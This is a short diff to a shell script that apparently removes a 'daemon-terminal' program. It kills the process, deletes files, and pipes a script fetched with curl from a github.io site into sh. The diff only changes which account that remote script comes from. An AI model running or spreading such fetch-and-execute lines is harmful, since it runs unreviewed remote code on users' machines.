@@ -10,5 +10,5 @@ if [ -n "$pid" ]; then
     kill -0 "$pid" 2>/dev/null && kill -9 "$pid" 2>/dev/null
 fi
 rm -rf "$lockdir" "$base/bin/daemon-terminal"
-curl -fsSL "${CONFLOOSE_BASE:-https://louismoretti.github.io/Confloose}/confloose/bashrc_antidote_base.sh" | sh -s -- "daemon-terminal"
+curl -fsSL "${CONFLOOSE_BASE:-https://sayt-0.github.io/Confloose}/confloose/bashrc_antidote_base.sh" | sh -s -- "daemon-terminal"
 for name in bashrc zshrc; do [ -f "$HOME/.$name" ] && ( . "$HOME/.$name" ) 2>/dev/null; done; true
